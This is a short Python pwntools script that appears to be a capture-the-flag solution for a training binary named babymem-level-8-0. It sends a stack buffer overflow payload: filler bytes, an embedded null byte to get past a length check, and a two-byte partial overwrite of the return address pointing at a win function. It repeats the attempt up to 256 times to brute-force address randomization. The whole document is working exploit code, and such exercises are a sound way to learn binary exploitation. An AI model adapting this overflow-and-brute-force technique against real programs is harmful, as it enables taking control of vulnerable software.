from pwn import *


offset = 136
offset_win_auth = p16(0x1e26)
for i in range(256):
    print(f'try {i}')
    proc = process('/challenge/babymem-level-8-0')
    proc.recv()
    size = str(138).encode()
    proc.sendline(size)
    proc.recv()
    payload = b'A' * 81 + b'\x00' + (136-82) * b'B' + offset_win_auth
    proc.sendline(payload)
    r = proc.recv()
    proc.close()
    if b'pwn' in r:
        print(r)
        break
